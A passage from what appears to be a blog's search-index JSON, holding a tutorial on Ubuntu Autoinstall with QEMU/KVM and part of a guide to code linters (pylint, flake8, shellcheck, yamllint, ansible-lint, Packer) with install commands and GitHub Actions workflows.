gtk\n</code></pre>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#autoinstall","title":"Autoinstall","text":"<p>Autoinstall, cloud-init, and user-data together can be confusing to delineate. The following links (in order) do a good job of framing what autoinstall is, and how it uses cloud-init.</p> <ul> <li>Subiquity autoinstaller uses cloud-init</li> <li>Intro to Subiquity autoinstaller</li> <li>Cloud-init and autoinstaller interaction</li> <li>Providing autoinstall</li> <li>The NoCloud datasource</li> <li>Cloud-config user-data formats</li> <li>Subiquity autoinstaller user-data \u2728</li> </ul> <p>That final link (star'd) has the syntax reference you need for an autoinstall user-data file.</p> <p>Subiquity autoinstaller user-data?</p> <p>This is the best way I can summarize this; <code>autoinstall:</code> is a \"parent\" to the <code>user-data:</code> file of a cloud-init cloud-config. Replace the user-data file with your <code>autoinstall:</code> data, which has <code>user-data:</code> embedded within it.</p> <p>In other words, you still have a user-data file. It's required for cloud-init to successfully provision a machine. However, all of your original user-data text now lives under a <code>user-data:</code> yaml block, along side other optional <code>autoinstall:</code> blocks.</p> <p>This can be incredibly confusing when trying to debug what's wrong with your config. More often than not, you're looking at the wrong examples.</p> <p>Autoinstall has been available since 20.04.</p> <ul> <li>Cloud-init QEMU Tutorial (this section builds off of these steps)</li> <li>Ubuntu Server 20.04+ (It's possible to use server to install <code>ubuntu-desktop</code>)</li> <li>Ubuntu Desktop 24.04+</li> </ul> <p>The GitHub project referenced is specifically for using Ubuntu's Autoinstall provisioning method. There are reasons why you might want to try this method yourself and observe the process via the console.</p> <p>Here are some additional copy-paste-ready snippets to help you replicate those steps that are more implied or specific to your environment, and aren't mentioned in that tutorial. This example installs Ubuntu 22.04 desktop, which requires the Ubuntu 22.04 server image to start with since Desktop doesn't have Autoinstall until 24.04.</p> <p>How does this work with QEMU?</p> <p>This example prefers serving the autoinstall data over the (localhost) network instead of using the <code>cloud-image-utils</code> package, which is exclusive to Ubuntu. This is so you can replicate the same steps on other OS's. You can create any directory for serving the autoinstall files, as long as you point to them via <code>kvm</code>/<code>qemu</code> or <code>packer</code>.</p> <p>QEMU will default to creating an ephemeral NAT network on <code>10.0.2.2/24</code> when you spin up the VM. When you bind a python web server to <code>0.0.0.0</code> or all interfaces, it will be reachable on <code>10.0.2.2:&lt;port&gt;</code>.</p> <p>The syntax for running <code>kvm</code> / <code>qemu</code> interactively are basically the same when doing this through <code>packer</code>'s <code>boot_command</code>.</p> <ul> <li>QEMU: <code>'autoinstall ds=nocloud-net;s=http://_gateway:3000/'</code></li> <li>Packer: <code>\" autoinstall ds=nocloud-net\\\\;s=http://10.0.2.2:{{ .HTTPPort }}/\",</code></li> </ul> <p>First, make a directory you'll serve the autoinstall files from.</p> <pre><code>mkdir -p ~/Public/http; \\\ncd ~/Public/http; \\\ntouch meta-data; \\\nwget https://github.com/canonical/autoinstall-desktop/raw/refs/heads/main/autoinstall.yaml -O user-data\n# This autoinstall.yaml file is short enough to manually inspect and modify\n</code></pre> <p>Modify and save your <code>user-data</code> content, then serve it.</p> <p>What goes in <code>user-data</code>?</p> <p>This is a complete reference to writing the user-data file.</p> <ul> <li>All cloud-config examples</li> <li>Examples library</li> </ul> <p>The example here is a very minimal config. You'll eventually want to modify this to fit your needs.</p> <pre><code>#cloud-config\nautoinstall:\n    # version is an Autoinstall required field.\n    version: 1\n\n    # User creation can occur in one of 3 ways:\n    # 1. Create a user using this `identity` section.\n    # 2. Create users as documented in cloud-init inside the user-data section,\n    #    which means this single-user identity section may be removed.\n    # 3. Prompt for user configuration on first boot.  Remove this identity\n    #    section and see the \"Installation without a default user\" section.\n    identity:\n        realname: 'ubuntu'\n        username: ubuntu\n        # A password hash is needed. `mkpasswd --method=SHA-512` can help.\n        # mkpasswd can be found in the package 'whois'\n        # The hash below represents a password of just \"ubuntu\" without the quotes\n        password: '$6$IEXNBzIlhRd2lR2e$ygPi2XMmQtKDKm3Z40xKUtEc00HIL9rUzJx7Hx9Xe.wqpiSIvHPC3RGEgvy7jfrydTNdlVsoHmUCShzQQtl5B0'\n        hostname: ubuntu-2204\n\n    # Controls password authentication with the SSH daemon; the default here\n    # prevents logging into SSH with a password. Changing this is a security risk\n    # and you should at the very least ensure a different default password is\n    # specified above\n    ssh_pwauth: true\n</code></pre> <p>Firewall rules</p> <p>If you have default-deny inbound rules in place on your firewall, you'll need to make an allowance for the <code>10.0.2.0/24</code> subnet, or whatever static IP you assign the VM, to be able to reach <code>10.0.2.2</code> on an optionally specified port to obtain the autoinstall files.</p> <p>Ensure your inbound firewall rules are scoped to the default QEMU network, so only the VM can talk to your python web server. Of course you'll need to adjust the QEMU default network if your LAN overlaps with 10.0.2.0/24.</p> <pre><code>your_ip=''\nwww_port=''\nqemu_subnet='10.0.2.0/24' # Common default subnet used by KVM/QEMU\nsudo ufw allow in to \"$your_ip\" proto tcp port \"$www_port\" from \"$qemu_subnet\" comment 'qemu autoinstall'\n</code></pre> <p>Serving autoinstall files</p> <p>Packer will automatically serve those files to itself using a webserver tied to the packer gateway IP.</p> <p>If you use QEMU on its own, you will have to spin up a python3 webserver to serve the autoinstall files.</p> <pre><code>cd ~/Public/http\npython3 -m http.server 3000\n</code></pre> <p>Create a mount point to reference the vmlinuz and initrd files within the ISO. This only appears to be necessary in some cases, when running QEMU itself outside of Packer.</p> <pre><code>sudo mkdir /mnt/ubuntu_iso\nsudo mount -r ~/iso/ubuntu-22.04/ubuntu-22.04.4-desktop-amd64.iso /mnt/ubuntu_iso\n</code></pre> <p>Create a virtual disk.</p> <pre><code>cd ~/src/packer_tutorial\ntruncate -s 10G ubuntu.img\n</code></pre> <p>Now boot the ISO with KVM, and direct it to use the proper options for Autoinstall.</p> <pre><code>cd ~/src/packer_tutorial\n\nkvm -no-reboot -m 4096 \\\n  -drive file=ubuntu.img,format=raw,cache=none,if=virtio \\\n  -cdrom ~/iso/ubuntu-22.04/ubuntu-22.04.4-live-server-amd64.iso \\\n  -kernel /mnt/ubuntu_iso/casper/vmlinuz \\\n  -initrd /mnt/ubuntu_iso/casper/initrd \\\n  -append 'autoinstall ds=nocloud-net;s=http://_gateway:3000/' \\\n  -boot d\n</code></pre> <p>vmlinuz and initrd files</p> <p>In older versions of Ubuntu, where you'd use preseed.cfg instead of Autoinstall, the vmlinuz and initrd files may be named differently (e.g. initrd.gz) and in different directories.</p> <p>Do a <code>find</code> to see where they are and change those paths accordingly.</p> <p>This will start QEMU, and kick off the Autoinstall process for the live server 22.04 image, which ultimately installs all of the desktop tools and environment for 22.04. This is a way around 22.04 having no Autoinstall capability. The entire process can be observed in the QEMU console window.</p> <p>When the installation completes the system will shutdown and you can boot into the new install.</p> <pre><code>kvm -no-reboot -m 4096 \\\n  -drive file=ubuntu.img,format=raw,cache=none,if=virtio\n</code></pre> <p>Unless you configure persistent networking, it's not always possible to route from your host into the QEMU subnet. If you want to forward localhost:2222 into the guest:22, you can do this:</p> <pre><code>kvm -no-reboot -m 4096 \\\n  -drive file=ubuntu.img,format=raw,cache=none,if=virtio \\\n  -netdev user,id=net0,hostfwd=tcp::2222-:22 \\\n  -device e1000,netdev=net0\n  # Here e1000 is used as the network card instead of virtio\n</code></pre> <p>Gave up waiting for root file system device</p> <p>This warning appears to happen anytime a QEMU VM is installed via Autoinstall, where initrd and vmlinuz need specified from the mounted ISO.</p> <pre><code>Gave up waiting for root file system device. Common problems:\n- Boot args (cat /proc/cmdline)\n    - Check rootdelay= (did the system wait long enough?)\n- Missing modules (cat /proc/modules: ls /dev)P &lt;unique-string&gt;\nALERT! /dev/mapper/ubuntu--vg--ubuntu--lv does not exist. Dropping to a shell!\n\nBusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3.1) built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n(initramfs) _\n</code></pre> <p>It's unclear how to resolve this, or why it's happening. The ubuntu.img disk can be chrooted into from the host, so this needs investigated further.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#security","title":"Security","text":"<p>Under the hood, virt-manager and libvirt are run by QEMU / KVM.</p> <p>Security Overview</p> <p>QEMU considers the following to be untrusted:</p> <ul> <li>Guest</li> <li>User-facing interfaces (e.g. VNC, SPICE, WebSocket)</li> <li>Network protocols (e.g. NBD, live migration)</li> <li>User-supplied files (e.g. disk images, kernels, device trees)</li> <li>Passthrough devices (e.g. PCI, USB)</li> </ul> <p>It's recommended to read through that entire page if you plan to leverage QEMU / KVM or similar technologies like Proxmox to run untrusted code.</p>"},{"location":"blog/2024/12/08/simple-qemu-kvm-kernel-based-virtual-machine/#backup-and-restore","title":"Backup and Restore","text":"<p>Section under construction</p> <p>This section is informational and untested. Check back later for more information.</p> <ul> <li>Reddit: How do you make a backup of virt-manager?</li> <li> <p>github: virtnbdbackup</p> </li> <li> <p><code>/var/lib/libvirt/images</code> VM disks</p> </li> <li><code>/etc/libvirt/qemu</code>: VM xml configs</li> </ul> <pre><code>sudo rsync -arv --delete --safe-links /var/lib/libvirt/images/ /media/user/external/Virtual-Machines/libvirt/var_lib_libvirt_images/\nsudo rsync -arv --delete --safe-links /etc/libvirt/qemu/ /media/user/external/Virtual-Machines/libvirt/etc_libvirt_qemu/\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/","title":"Linting Code","text":"<p>Linting is running documented checks to statically analyze code for common mistakes and errors.</p> <p>It can also be a great way to learn a new programming language as you'll be pointed to coding conventions, often in the form of the problematic code snippet, suggestions on how to refactor it, and the reasoning behind why.</p> <p>Not every language has a standard linter, and some languages have multiple linters that are popular to use.</p> <p>This guide is meant to get you started with linting, from \"how to install\" to \"how to use\" linters. It contains examples for both interactive CLI and automated CI/CD-focused workflows in Python, bash, PowerShell, Ansible, Packer, Terraform, with more to be added over time.</p> <p>Additional Resources</p> <p>The following resources will be useful if you're getting started with linting or CI/CD.</p> <ul> <li>Wikipedia: Linting</li> <li>OWASP: Linting</li> <li>CI/CD</li> <li>VSCode</li> <li>GitHub Actions</li> </ul>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#actionscheckout","title":"actions/checkout","text":"<p>The First Step</p> <p>This action is core to basically every GitHub workflow, by checking out the necessary repositories using any specific arguments, all defined as a GitHub action.</p> <p>Checkout a Git repository at a particular version</p> <ul> <li>https://github.com/actions/checkout</li> <li>https://github.com/marketplace/actions/checkout</li> </ul> <p>GitHub Actions</p> <pre><code># https://github.com/actions/checkout?tab=readme-ov-file#checkout-multiple-repos-side-by-side\n- name: Checkout\n  uses: actions/checkout@v6\n  with:\n    path: main\n\n- name: Checkout another repo\n  uses: actions/checkout@v6\n  with:\n    repository: my-org/my-tools\n    path: my-tools\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#python","title":"Python","text":"<p>actions/setup-python</p> <p>Set up a specific version of Python and add the command-line tools to the PATH</p> <p>This action is used to test, build, and publish numerous official python packages. See the Python packaging documentaiton for examples. It has also been verified by GitHub.</p> <ul> <li>github.com/actions/setup-python</li> <li>GitHub Marketplace</li> </ul> <p>Basic usage:</p> <pre><code>steps:\n- uses: actions/checkout@v5\n- uses: actions/setup-python@v6\n  with:\n    python-version: '3.13'\n- run: python my_script.py\n</code></pre> <p>Virtual Environments</p> <p>In most cases you'll want to use a <code>venv</code> (virtual environment) or <code>pipx</code>, which achieves the same.</p> <ul> <li>Use virtual environments for programming projects, or installing libraries</li> <li>Use <code>pipx</code> when you're installing a python package that will run as a program would from the CLI</li> <li>You can use either to version-pin python packages, or have multiple versions of a package installed</li> </ul> <p>See ansible-lint below for an example.</p> <p><code>pip install --user</code></p> <p>In cases where a virtual environment or pipx isn't practical, such as an ephemeral developer VM or a system dedicated to running a specific workload, you can avoid polluting your system libraries by using the <code>--user</code> option when installing pip packages. In the worst case scenario, these only break other packages installed locally for that user, and can be removed / reinstalled with a higher chance of success than if these replaced system-level packages.</p>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#pylint","title":"pylint","text":"<p>Overview</p> <p>Pylint is a static code analyser for Python 2 or 3. The latest version supports Python 3.10.0 and above.</p> <p>Pylint analyses your code without actually running it. It checks for errors, enforces a coding standard, looks for code smells, and can make suggestions about how the code could be refactored.</p> <ul> <li>Website / Documentation</li> <li>GitHub</li> <li>Configuration</li> <li>VS Marketplace Extension</li> </ul> <p>pylint vs flake8</p> <p><code>pylint</code> is generally much more strict than <code>flake8</code>.</p> <p>Install</p> <p>Install via pip, in a venv, or possibly with pipx:</p> <pre><code>python3 -m pip install pylint\n</code></pre> <p>Usage</p> <p>This will run recursively in the current directory:</p> <pre><code>pylint .\n</code></pre> <p>Configure</p> <p>To configure, you can auto-generate an INI file, and save it in the project root as <code>.pylintrc</code>:</p> <pre><code>pylint --disable=bare-except,invalid-name --class-rgx='[A-Z][a-z]+' --generate-rcfile | tee .pylintrc &gt;/dev/null\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/workflows/pylint.yml\n\n# Built from the following examples:\n# - https://www.shellcheck.net/wiki/GitHub-Actions\n# - https://github.com/geerlingguy/ansible-role-docker/blob/master/.github/workflows/ci.yml\n\nname: pylint\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\njobs:\n  pylint:\n    name: pylint\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v5\n    - uses: actions/setup-python@v6\n    #  with:\n    #    python-version: '3.13'\n    - name: Run pylint\n      run: |\n        python3 -m pip install pylint\n        pylint .\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#flake8","title":"flake8","text":"<p>Overview</p> <p>flake8 is a python tool that glues together pycodestyle, pyflakes, mccabe, and third-party plugins to check the style and quality of some python code.</p> <ul> <li>Website / Documentation</li> <li>GitHub</li> <li>Configuration</li> <li>VS Marketplace Extension</li> </ul> <p>pylint vs flake8</p> <p><code>pylint</code> is generally much more strict than <code>flake8</code>.</p> <p>Install</p> <p>Install via pip, in a venv, or possibly with pipx:</p> <pre><code>python3 -m pip install flake8\n</code></pre> <p>Usage</p> <p>This will run recursively in the current directory:</p> <pre><code>flake8 .\n</code></pre> <p>Configure</p> <p>To configure, create an INI file in the project root titled <code>.flake8</code>:</p> <pre><code>[flake8]\nextend-ignore = E203\nexclude =\n    .git,\n    __pycache__,\n    docs/source/conf.py,\n    old,\n    build,\n    dist\nmax-complexity = 10\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/workflows/flake8.yml\n\n# Built from the following examples:\n# - https://www.shellcheck.net/wiki/GitHub-Actions\n# - https://github.com/geerlingguy/ansible-role-docker/blob/master/.github/workflows/ci.yml\n\nname: flake8\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\njobs:\n  flake8:\n    name: flake8\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v5\n    - uses: actions/setup-python@v6\n    #  with:\n    #    python-version: '3.13'\n    - name: Run flake8\n      run: |\n        python3 -m pip install flake8\n        flake8 .\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#mypy","title":"mypy","text":"<p>Overview</p> <p>Mypy is a static type checker for Python.</p> <p>Type checkers help ensure that you're using variables and functions in your code correctly. With mypy, add type hints (PEP 484) to your Python programs, and mypy will warn you when you use those types incorrectly.</p> <p>Python is a dynamic language, so usually you'll only see errors in your code when you attempt to run it. Mypy is a static checker, so it finds bugs in your programs without even running them!</p> <ul> <li>Website</li> <li>Documentation</li> <li>GitHub</li> <li>VS Marketplace Extension</li> </ul> <p>Install</p> <p>Install via pip, in a venv, or possibly with pipx:</p> <pre><code>python3 -m pip install mypy\n</code></pre> <p>Usage</p> <pre><code>mypy program.py\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#bash","title":"Bash","text":""},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#shellcheck","title":"shellcheck","text":"<p>Overview</p> <p>ShellCheck is a GPLv3 tool that gives warnings and suggestions for bash/sh shell scripts.</p> <p>The goals of ShellCheck are:</p> <ul> <li>To point out and clarify typical beginner's syntax issues that cause a shell to give cryptic error messages.</li> <li>To point out and clarify typical intermediate level semantic problems that cause a shell to behave strangely and counter-intuitively.</li> <li>To point out subtle caveats, corner cases and pitfalls that may cause an advanced user's otherwise working script to fail under future circumstances.</li> </ul> <ul> <li>GitHub</li> <li>Website</li> <li>Azure Pipelines</li> <li>GitHub Actions</li> <li>GitLab CI</li> <li>Ignoring Errors</li> </ul> <p>Install</p> <pre><code>sudo apt update\nsudo apt install -y shellcheck\n</code></pre> <p>Usage</p> <pre><code>shellcheck ./some-script.sh\n</code></pre> <p>Configure</p> <p>The most common way to tune <code>shellcheck</code> output is with exclusions directly within each script.</p> <pre><code>#!/bin/bash\n\n# shellcheck disable=SC2059\nsome_function() {\n    &lt;SNIP&gt;\n</code></pre> <p>You could also create a <code>~/.shellcheckrc</code> with the same directives.</p> <pre><code># ~/.shellcheckrc\ndisable=SC2059,SC2034 # Disable individual error codes\ndisable=SC1090-SC1100 # Disable a range of error codes\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/worflows/shellcheck.yml\n\n# Built from the following examples:\n# - https://github.com/koalaman/shellcheck/wiki/GitHub-Actions\n\nname: \"ShellCheck\"\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\n\njobs:\n  shellcheck:\n    name: ShellCheck\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n    - name: Run ShellCheck\n      run: find . -type f -name \"*.sh\" -exec shellcheck {} +\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#powershell","title":"PowerShell","text":""},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#psscriptanalyzer","title":"PSScriptAnalyzer","text":"<p>Overview</p> <p>PSScriptAnalyzer is a static code checker for PowerShell modules and scripts. PSScriptAnalyzer checks the quality of PowerShell code by running a set of rules. The rules are based on PowerShell best practices identified by PowerShell Team and the community. It generates DiagnosticResults (errors and warnings) to inform users about potential code defects and suggests possible solutions for improvements.</p> <ul> <li>Installation</li> <li>Usage</li> <li>GitHub</li> <li>GitHub Actions (this may no longer be maintained, the example below does not use it)</li> </ul> <p>Install &amp; Usage</p> <p>Supported PowerShell Versions and Platforms</p> <ul> <li> <p>Windows PowerShell 5.1 or greater</p> </li> <li> <p>PowerShell 7.2.11 or greater on Windows/Linux/macOS</p> </li> </ul> <p>Install using PowerShellGet 2.x:</p> <pre><code>Install-Module -Name PSScriptAnalyzer -Force\n</code></pre> <p>Install using PSResourceGet 1.x:</p> <pre><code>Install-PSResource -Name PSScriptAnalyzer -Reinstall\n</code></pre> <p>The Force or Reinstall parameters are only necessary when you have an older version of</p> <p><code>PSScriptAnalyzer</code> installed. These parameters also work even when you don't have a previous version</p> <p>installed.</p> <p>To lint PowerShell code, you can use various built-in presets via the <code>-Settings &lt;Preset&gt;</code> option:</p> <pre><code>Invoke-ScriptAnalyzer -Path /path/to/module/ -Settings PSGallery -Recurse\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/worflows/psscriptanalyzer.yml\n\n# Built from the following examples:\n# - https://github.com/koalaman/shellcheck/wiki/GitHub-Actions\n# - https://learn.microsoft.com/en-us/powershell/utility-modules/psscriptanalyzer/overview?view=ps-modules\n\nname: \"PSScriptAnalyzer\"\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\n\njobs:\n  psscriptanalyzer:\n    name: PSScriptAnalyzer\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v5\n    - name: Run PSScriptAnalyzer\n    run: |\n      Install-Module -Name PSScriptAnalyzer -Force\n      Invoke-ScriptAnalyzer -Path .\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#yaml","title":"YAML","text":""},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#yamllint","title":"yamllint","text":"<p>Overview</p> <p>A linter for YAML files.</p> <p>yamllint does not only check for syntax validity, but for weirdnesses like key repetition and cosmetic problems such as lines length, trailing spaces, indentation, etc.</p> <ul> <li>yamllint Docs: Quick Start</li> <li>Configuring yamllint</li> <li>github.com/adrienverge/yamllint</li> </ul> <p>What uses yamllint?</p> <p>yamllint is used by ansible-lint to validate Ansible code.</p> <p>Install</p> <p>Install via your package manager, or pip / pipx:</p> <pre><code># apt, Debian 8+ / Ubuntu 16.04+\nsudo apt-get install yamllint\n\n# dnf\nsudo dnf install yamllint\n\n# pip / pipx\npip install --user yamllint\n</code></pre> <p>Usage</p> <p>Running yamllint:</p> <pre><code># Target specific files\nyamllint file.yml other-file.yaml\n\n# Run on project folder\nyamllint .\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/workflows/yamllint.yml\n\n# Built from the following examples:\n# - https://www.shellcheck.net/wiki/GitHub-Actions\n# - https://github.com/geerlingguy/ansible-role-docker/blob/master/.github/workflows/ci.yml\n\nname: YAML\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\njobs:\n  lint:\n    name: Lint YAML files\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v5\n    - uses: actions/setup-python@v6\n    #  with:\n    #    python-version: '3.13'\n    - name: Run yamllint\n      run: |\n        python3 -m pip install yamllint\n        yamllint .\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#json","title":"JSON","text":""},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#jq","title":"jq","text":"<p>Overview</p> <p>jq is the most common way to parse JSON data.</p> <p><code>jq</code> is a lightweight and flexible command-line JSON processor akin to <code>sed</code>,<code>awk</code>,<code>grep</code>, and friends for JSON data. It's written in portable C and has zero runtime dependencies, allowing you to easily slice, filter, map, and transform structured data.</p> <ul> <li>github.com/jqlang/jq (previously https://github.com/stedolan/jq)</li> <li>jq Wiki</li> <li>Homepage (redirect from http://jqlang.github.io/jq)</li> </ul> <p>Not jQuerry</p> <p>This is a CLI parser like <code>sed</code> or <code>awk</code> but for JSON. It's not related to the jQuerry JavaScript library.</p> <p>Install</p> <p>It's common to use package managers to install it, such as <code>apt</code>, <code>brew</code>, or even Docker.</p> <pre><code>sudo apt update; sudo apt install -y jq\n</code></pre> <p>Usage</p> <p>The tutorial is the best way to visualize this. <code>jq</code> requires a filter, and the input data, at a minimum.</p> <pre><code># jq [options...] filter [files...]\njq '.' file.json\n</code></pre> <p>GitHub Actions</p> <pre><code># .github/workflows/json.yml\n\n# Built from the following examples:\n# - https://www.shellcheck.net/wiki/GitHub-Actions\n# - https://www.shellcheck.net/wiki/SC2013\n# - https://github.com/geerlingguy/ansible-role-docker/blob/master/.github/workflows/ci.yml\n\nname: JSON\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\njobs:\n  lint:\n    name: Lint JSON files\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v5\n    - name: Install jq\n      run: apt update; apt install -y jq\n    - name: Process files\n      run: |\n        find . -type f -name \"*.json\" | while IFS= read -r file\n        do\n            echo \"[*]Parsing $file\"\n            if ! jq '.' \"$file\" &gt;/dev/null\n            then\n                echo \"[-]Error processing $file\"\n                break\n            fi\n        done\n</code></pre>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#ansible","title":"Ansible","text":""},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#ansible-lint","title":"ansible-lint","text":"<p>Overview</p> <p>For guidance on writing Ansible code, reference the Ansible Lint Documentation.</p> <p><code>ansible-lint</code> can be used on your playbooks, roles, or collections to check for common mistakes when writing Ansible code.</p> <ul> <li>Installing ansible-lint</li> <li>GitHub Action: run-ansible-lint</li> <li>GitHub Action: ansible-lint.yml Example</li> </ul> <p>Install</p> <p>There are a number of ways to do this, but you can install <code>ansible-lint</code> just like <code>ansible</code>.</p> <p>With <code>pipx</code>:</p> <pre><code>pipx install ansible-lint\n</code></pre> <p>With <code>pipx</code>, using a specific version:</p> <pre><code>version_number=\"1.2.3\"\npackage_name='ansible-lint'\npipx install --suffix=_\"$version_number\" \"$package_name\"==\"$version_number\"\n</code></pre> <p>With <code>pip</code>:</p> <pre><code>python3 -m pip install --user ansible-lint\n</code></pre> <p>Usage</p> <p>This will operate recursively on the current directory:</p> <pre><code>ansible-lint .\n</code></pre> <p>Configure</p> <ul> <li>Configuring ansible-lint</li> </ul> <p>The \"new\" way to do this, if you also intend to leverage the latest GitHub action in your CI/CD pipeline, is to use a configuration file to specify what <code>ansible-lint</code> should be checking. <code>ansible-lint</code> will look in the current directory, and then ascend directories, until getting to the git project root, looking for one of the following filenames:</p> <ul> <li> <p><code>.ansible-lint</code>, this file lives in the project root</p> </li> <li> <p><code>.config/ansible-lint.yml</code>, this file exists within a <code>.config</code> folder</p> </li> <li> <p><code>.config/ansible-lint.yaml</code>, same as the previous file</p> </li> </ul> <p>NOTE: When using the <code>.config/</code> path, any paths specified in the <code>ansible-lint.yml</code> config file must have <code>../</code> prepended so ansible-lint can find them correctly.</p> <p>The easiest way to start, is with a profile, and excluding the <code>meta/</code> and <code>tests/</code> paths in roles. This is a less verbose version of the <code>.ansible-lint</code> file used in this repo.</p> <pre><code># .ansible-lint\n\n# Full list of configuration options:\n# https://ansible.readthedocs.io/projects/lint/configuring/\n\n# Profiles: null, min, basic, moderate, safety, shared, production\n# From left to right, the requirements to pass the profile checks become more strict.\n# Safety is a good starting point.\nprofile: safety\n\n# Shell globs are supported for exclude_paths:\n# - https://github.com/ansible/ansible-lint/pull/1425\n# - https://github.com/ansible/ansible-lint/discussions/1424\nexclude_paths:\n  - .cache/      # implicit unless exclude_paths is defined in config\n  - .git/        # always ignore\n  - .github/     # always ignore\n  - \"*/tests/\"   # ignore tests/ folder for all roles\n  - \"*/meta/\"    # ignore meta/ folder for all roles\n\n# These are checks that may often cause errors / failures.\n# If you need to make exceptions for any check, add it here.\nwarn_list:\n  - yaml[line-length]\n\n# Offline mode disables installation of requirements.yml and schema refreshing\noffline: true\n</code></pre> <p>Over time you may want to shift the profile to <code>shared</code> or <code>production</code>, and also tell <code>ansible-lint</code> to check the <code>tests/</code> and <code>meta/</code> paths for each role if you intend to publish them to ansible-galaxy.</p> <p>GitHub Actions</p> <p>This is an example file that runs <code>ansible-lint</code> on your GitHub repo when a new commit or PR is made to the \"main\" branch.</p> <p>GitHub Actions Version vs Pip</p> <p>Sometimes the version of <code>ansible-lint</code> installed by the GitHub Actions workflow is aheads of the latest stable release you'd get from pip. This may cause failures that you may not see while running the version installed via <code>pip</code>/<code>pipx</code> locally.</p> <pre><code># .github/workflows/ansible-lint.yml\n\n# Taken from the following example:\n# https://github.com/ansible/ansible-lint?tab=readme-ov-file#using-ansible-lint-as-a-github-action\n\nname: ansible-lint\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\njobs:\n  build:\n    name: Ansible Lint # Naming the build is important to use it as a status check\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Run ansible-lint\n        uses: ansible/ansible-lint@main # or version tag instead of 'main'\n</code></pre> <p>Errors</p> <p>Older versions of ansible-lint may produces errors that are difficult to diagnose. When this happens, use a very simple main.yml file, and start slowly adding tasks or vars to this file. Once you identify a task that creates an error, you can begin narrowing down which line(s) in the task or vars are producing the error.</p> <p>One example of this is new versions of Ansible lint will want you to use <code>become_method: ansible.builtin.sudo</code>, while older versions require <code>become_method: sudo</code> and will generate a <code>schema[tasks]</code> error in this case.</p>"},{"location":"blog/2024/12/28/material-code-tags-check-linting-code/#packer","title":"Packer","text":"<p>Overview</p> <p>Packer is a tool for building identical machine images for multiple platforms from a single source configuration.</p> <p>Packer is lightweight, runs on every major operating system, and is highly performant, creating machine images for multiple platforms in parallel. Packer supports various platforms through external plugin integrations, the full list of which can be found at https://developer.hashicorp.com/packer/integrations.</p> <p>The images that Packer creates can easily be turned into Vagrant boxes.</p> <ul> <li>Packer Install</li> <li>Packer Commands</li> <li>GitHub Actions: setup-packer</li> </ul> <p>Install</p> <p>This downloads the HashiCorp GPG key, adds the repo information, and installs <code>packer</code> on Debian/Ubuntu.</p> <pre><code>curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -\nsudo apt-add-repository \"deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main\"\nsudo apt-get update &amp;&amp; sudo apt-get install packer\n</code></pre> <p>For reference, this is the current HashiCorp GPG key data:</p> <pre><code>pub   rsa4096/0xAA16FCBCA621E701 2023-01-10 [SC] [expires: 2028-01-09]\n      Key fingerprint = 798A EC65 4E5C 1542 8C8E  42EE AA16 FCBC A621 E701\nuid                             HashiCorp Security (HashiCorp Package Signing) &lt;security+packaging@hashicorp.com&gt;\nsub   rsa4096/0x706E668369C085E9 2023-01-10 [S] [expires: 2028-01-09]\n</code></pre> <p>Usage</p> <p>Initialize a packer template. This downloads any missing plugins described in the <code>packer {}</code> block to your local machine.</p> <p>Malicious Plugins</p> <p>Review plugins described in the <code>packer {}</code> block of any template before executing this.</p> <pre><code>cd /path/to/my-packer-project\npacker init .\n</code></pre> <p>Format the packer templates. Rewrites HCL2 config files to canonical format. Run this after making edits to your templates or as part of CI/CD.</p> <pre><code>packer fmt .\n</code></pre> <p>Validate the Packer templates. Run this after making edits to your templates or as part of CI/CD.</p> <pre><code>packer validate .\n</code></pre> <p>GitHub Actions</p> <p>This is an example file that runs packer code validation on your GitHub repo when a new commit or PR is made to the \"main\" branch.</p> <pre><code># .github/workflows/packer.yml\n\n# Taken from:\n# https://github.com/hashicorp/setup-packer\n\nname: packer\n\non:\n  push:\n    branches: [\"main\"]\n  pull_request:\n    branches: [\"main\"]\n\nenv:\n  PRODUCT_VERSION: \"latest\"\n\njobs:\n  packer:\n    runs-on: 